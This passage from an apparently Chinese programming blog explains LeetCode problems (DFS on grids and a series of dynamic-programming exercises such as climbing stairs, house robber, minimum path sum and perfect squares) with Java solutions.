class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (board == <span class="keyword">null</span> || board.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        m = board.length;</span><br><span class="line">        n = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(board,i,<span class="number">0</span>);</span><br><span class="line">            dfs(board,i,n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(board,<span class="number">0</span>,i);</span><br><span class="line">            dfs(board,m-<span class="number">1</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;N&#x27;</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) </span><br><span class="line">                    &#123;</span><br><span class="line">                        board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || board[i][j] != <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] d : direction) &#123;</span><br><span class="line">            dfs(board, i + d[<span class="number">0</span>], j + d[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-能到达的太平洋和大西洋的区域"><a class="markdownIt-Anchor" href="#6-能到达的太平洋和大西洋的区域"></a> 6. 能到达的太平洋和大西洋的区域</h3><p>  <a href="https://leetcode-cn.com/problems/pacific-atlantic-water-flow/">https://leetcode-cn.com/problems/pacific-atlantic-water-flow/</a></p><h4 id="思路-36"><a class="markdownIt-Anchor" href="#思路-36"></a> 思路</h4><p>  从上下左右边界出发，寻找递增路线从而找到每个大洋可以触及的节点，如果两个大洋都能触及，则满足要求。</p><h4 id="代码-34"><a class="markdownIt-Anchor" href="#代码-34"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] matrix;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pacificAtlantic(<span class="keyword">int</span>[][] matrix) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;<span class="keyword">int</span>[]&gt; ret = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (matrix == <span class="keyword">null</span> || matrix.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        m = matrix.length;</span><br><span class="line">        n = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">this</span>.matrix = matrix;</span><br><span class="line">        <span class="keyword">boolean</span>[][] canReachP = <span class="keyword">new</span> <span class="keyword">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">boolean</span>[][] canReachA = <span class="keyword">new</span> <span class="keyword">boolean</span>[m][n];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dfs(i, <span class="number">0</span>, canReachP);</span><br><span class="line">            dfs(i, n - <span class="number">1</span>, canReachA);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dfs(<span class="number">0</span>, i, canReachP);</span><br><span class="line">            dfs(m - <span class="number">1</span>, i, canReachA);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (canReachP[i][j] &amp;&amp; canReachA[i][j]) &#123;</span><br><span class="line">                    List&lt;Integer&gt; temp=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                    temp.add(i);</span><br><span class="line">                    temp.add(j);</span><br><span class="line">                    res.add(temp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> c, <span class="keyword">boolean</span>[][] canReach)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (canReach[r][c]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        canReach[r][c] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] d : direction) &#123;</span><br><span class="line">            <span class="keyword">int</span> nextR = d[<span class="number">0</span>] + r;</span><br><span class="line">            <span class="keyword">int</span> nextC = d[<span class="number">1</span>] + c;</span><br><span class="line">            <span class="keyword">if</span> (nextR &lt; <span class="number">0</span> || nextR &gt;= m || nextC &lt; <span class="number">0</span> || nextC &gt;= n</span><br><span class="line">                    || matrix[r][c] &gt; matrix[nextR][nextC]) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dfs(nextR, nextC, canReach);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七-动态规划"><a class="markdownIt-Anchor" href="#七-动态规划"></a> 七、动态规划</h2><h3 id="1-爬楼梯"><a class="markdownIt-Anchor" href="#1-爬楼梯"></a> 1. 爬楼梯</h3><p>  <a href="https://leetcode-cn.com/problems/climbing-stairs/">https://leetcode-cn.com/problems/climbing-stairs/</a></p><h4 id="思路-37"><a class="markdownIt-Anchor" href="#思路-37"></a> 思路</h4><p>  如果用<code>dp[i]</code>代表到第i级台阶的跳法，由于一次可以跳一级或者两级，所以<code>dp[i]=dp[i-1]+dp[i-2]</code></p><h4 id="代码-35"><a class="markdownIt-Anchor" href="#代码-35"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> pre2 = <span class="number">1</span>, pre1 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cur = pre1 + pre2;</span><br><span class="line">            pre2 = pre1;</span><br><span class="line">            pre1 = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-强盗抢劫"><a class="markdownIt-Anchor" href="#2-强盗抢劫"></a> 2. 强盗抢劫</h3><p>  <a href="https://leetcode-cn.com/problems/house-robber/">https://leetcode-cn.com/problems/house-robber/</a></p><h4 id="思路-38"><a class="markdownIt-Anchor" href="#思路-38"></a> 思路</h4><p>  如果用<code>dp[i]</code>代表在当前房屋所能获取的最大收益，那么对于房屋i，一共有两种选择，即偷和不偷。如果偷的话，获得的收益就是<code>dp[i-2]+nums[i]</code>,如果不偷，那么收益就是<code>dp[i-1]</code>，两者取大者，就是当前房屋的最大收益，随后遍历即可。</p><h4 id="代码-36"><a class="markdownIt-Anchor" href="#代码-36"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pre2 = <span class="number">0</span>, pre1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cur = Math.max(pre2 + nums[i], pre1);</span><br><span class="line">            pre2 = pre1;</span><br><span class="line">            pre1 = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-强盗在环形街区抢劫"><a class="markdownIt-Anchor" href="#3-强盗在环形街区抢劫"></a> 3. 强盗在环形街区抢劫</h3><p>  <a href="https://leetcode-cn.com/problems/house-robber-ii/">https://leetcode-cn.com/problems/house-robber-ii/</a></p><h4 id="思路-39"><a class="markdownIt-Anchor" href="#思路-39"></a> 思路</h4><p>  与非环抢劫的区别就是要单独处理首尾，第一个与最后一个只能选一个抢。</p><h4 id="代码-37"><a class="markdownIt-Anchor" href="#代码-37"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(rob(nums,<span class="number">0</span>,nums.length-<span class="number">1</span>),rob(nums,<span class="number">1</span>,nums.length));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pre2 = <span class="number">0</span>, pre1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cur = Math.max(pre2 + nums[i], pre1);</span><br><span class="line">            pre2 = pre1;</span><br><span class="line">            pre1 = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-矩阵的最小路径和"><a class="markdownIt-Anchor" href="#4-矩阵的最小路径和"></a> 4. 矩阵的最小路径和</h3><p>  <a href="https://leetcode-cn.com/problems/minimum-path-sum/">https://leetcode-cn.com/problems/minimum-path-sum/</a></p><h4 id="思路-40"><a class="markdownIt-Anchor" href="#思路-40"></a> 思路</h4><p>  对于矩阵每一行进行一次遍历，每行的每个格子都只有从上走下来和从左走过来两种选择，所以<code>dp[i][j]=min(dp[i][j-1],dp[i-1][j])+grid[i][j]</code>。</p><h4 id="代码-38"><a class="markdownIt-Anchor" href="#代码-38"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] dp=<span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;grid.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;grid[<span class="number">0</span>].length;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>&amp;&amp;j==<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j]+grid[i][j];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">                        dp[i][j]=dp[i][j-<span class="number">1</span>]+grid[i][j];</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        dp[i][j]=Math.min(dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j])+grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[grid.length-<span class="number">1</span>][grid[<span class="number">0</span>].length-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//空间优化版本，一维dp数组</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (grid.length == <span class="number">0</span> || grid[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m = grid.length, n = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[j] = dp[j];        <span class="comment">// 只能从上侧走到该位置</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[j] = dp[j - <span class="number">1</span>];    <span class="comment">// 只能从左侧走到该位置</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[j] = Math.min(dp[j - <span class="number">1</span>], dp[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                dp[j] += grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-矩阵的总路径数"><a class="markdownIt-Anchor" href="#5-矩阵的总路径数"></a> 5. 矩阵的总路径数</h3><p>  <a href="https://leetcode-cn.com/problems/unique-paths/">https://leetcode-cn.com/problems/unique-paths/</a></p><h4 id="思路-41"><a class="markdownIt-Anchor" href="#思路-41"></a> 思路</h4><p>  对于每个<code>dp[i][j]</code>，到达该格子有从左和从上两个方式到达，最顶上和最左边的边界只有一种方式到达。</p><h4 id="代码-39"><a class="markdownIt-Anchor" href="#代码-39"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] dp=<span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>||j==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j]+dp[i][j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>][n-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-数组区间和"><a class="markdownIt-Anchor" href="#6-数组区间和"></a> 6. 数组区间和</h3><p>  <a href="https://leetcode-cn.com/problems/range-sum-query-immutable/">https://leetcode-cn.com/problems/range-sum-query-immutable/</a></p><h4 id="思路-42"><a class="markdownIt-Anchor" href="#思路-42"></a> 思路</h4><p>  因为会多次调用，所以每次都累加是不合适的。遍历数组一遍，保存每次到i的累和，然后返回两个边界的累和差值即可。</p><h4 id="代码-40"><a class="markdownIt-Anchor" href="#代码-40"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NumArray</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] sums;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NumArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        sums = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= nums.length; i++) &#123;</span><br><span class="line">            sums[i] = sums[i - <span class="number">1</span>] + nums[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumRange</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sums[j + <span class="number">1</span>] - sums[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-数组中等差递增子区间的个数"><a class="markdownIt-Anchor" href="#7-数组中等差递增子区间的个数"></a> 7. 数组中等差递增子区间的个数</h3><p>  <a href="https://leetcode-cn.com/problems/arithmetic-slices/">https://leetcode-cn.com/problems/arithmetic-slices/</a></p><h4 id="思路-43"><a class="markdownIt-Anchor" href="#思路-43"></a> 思路</h4><p>  用<code>dp[i]</code>代表以<code>A[i]</code>为结尾的等差数列的数量，那么只有两种情况：</p><ol><li>当前的A[i]与前面的数据项构不成等差数列，则此处为0。</li><li>当前的A[i]与前面的数据能构成等差数列，此时有<code>A[i]-A[i-1]=A[i-1]-A[i-2]</code>,那么此时的等差数列种数为<code>dp[i-1]+1</code></li></ol><h4 id="代码-41"><a class="markdownIt-Anchor" href="#代码-41"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (A == <span class="keyword">null</span> || A.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n = A.length;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] - A[i - <span class="number">1</span>] == A[i - <span class="number">1</span>] - A[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                dp[i] = dp[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> cnt : dp) &#123;</span><br><span class="line">            total += cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-分割整数的最大乘积"><a class="markdownIt-Anchor" href="#8-分割整数的最大乘积"></a> 8. 分割整数的最大乘积</h3><p>  <a href="https://leetcode-cn.com/problems/integer-break/">https://leetcode-cn.com/problems/integer-break/</a></p><h4 id="思路-44"><a class="markdownIt-Anchor" href="#思路-44"></a> 思路</h4><p>  如果用<code>dp[i]</code>代表正整数i拆分后的最大乘积，那么他有三种选择：</p><ol><li>dp[i]自身</li><li>从<code>1~dp[i]</code>遍历，然后获得j*dp[i-j]</li><li>从<code>1~dp[i]</code>遍历，然后获得j*(i-j)</li></ol><p>  取三者最大值</p><h4 id="代码-42"><a class="markdownIt-Anchor" href="#代码-42"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-按平方数来分割整数"><a class="markdownIt-Anchor" href="#9-按平方数来分割整数"></a> 9. 按平方数来分割整数</h3><p>  <a href="https://leetcode-cn.com/problems/perfect-squares/">https://leetcode-cn.com/problems/perfect-squares/</a></p><h4 id="思路-45"><a class="markdownIt-Anchor" href="#思路-45"></a> 思路</h4><p>  两个思路，一个是采用DP的方式，一个是采用数学定理的方式。</p><ol><li>DP<br />  定义一个函数f(n)表示我们要求的解。f(n)的求解过程为：<br />f(n) = 1 + min{<br />f(n-1^2), f(n-2^2), f(n-3^2), f(n-4^2), … , f(n-k^2) //(k为满足k^2&lt;=n的最大的k)<br />}</li><li>数学定理<br />  四平方定理：任何一个正整数都可以表示成不超过四个整数的平方之和。<br />  推论：满足四数平方和定理的数n（四个整数的情况），必定满足 n=4^a(8b+7)</li></ol><h4 id="代码-43"><a class="markdownIt-Anchor" href="#代码-43"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DP版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] res = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j*j &lt;= i; j++)&#123;</span><br><span class="line">                min = Math.min(min, res[i-j*j]);</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = min + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数学定理版</span></span><br><span class="line"><span class="comment">// 由定理可知，结果只有 “1、2、3、4” 四种可能。依次判断下列情况：</span></span><br><span class="line"><span class="comment">// （1）ans = 4 ，判断是否满足推论；（在此过程中，以 4 的倍数缩小 n ，并不影响最后结果）</span></span><br><span class="line"><span class="comment">// （2）ans = 1 ，判断缩小后的 n 是否为平方数；</span></span><br><span class="line"><span class="comment">// （3）ans = 2 ，判断缩小后的 n 是否可以由两个平方数构成；</span></span><br><span class="line"><span class="comment">// （4）ans = 3， 以上都不满足，则结果为 3。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(n%<span class="number">4</span>==<span class="number">0</span>)</span><br><span class="line">            n/=<span class="number">4</span>;</span><br><span class="line">         <span class="keyword">if</span>(n%<span class="number">8</span>==<span class="number">7</span>)</span><br><span class="line">             <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i*i&lt;n;i++)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">int</span> j=(<span class="keyword">int</span>)Math.sqrt(n-i*i);</span><br><span class="line">             <span class="keyword">if</span>(j*j+i*i==n)</span><br><span class="line">                 <span class="keyword">if</span>(i!=<span class="number">0</span>&amp;&amp;j!=<span class="number">0</span>)</span><br><span class="line">                     <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-分割整数构成字母字符串"><a class="markdownIt-Anchor" href="#10-分割整数构成字母字符串"></a> 10. 分割整数构成字母字符串</h3><p>  <a href="https://leetcode-cn.com/problems/decode-ways/">https://leetcode-cn.com/problems/decode-ways/</a></p><h4 id="思路-46"><a 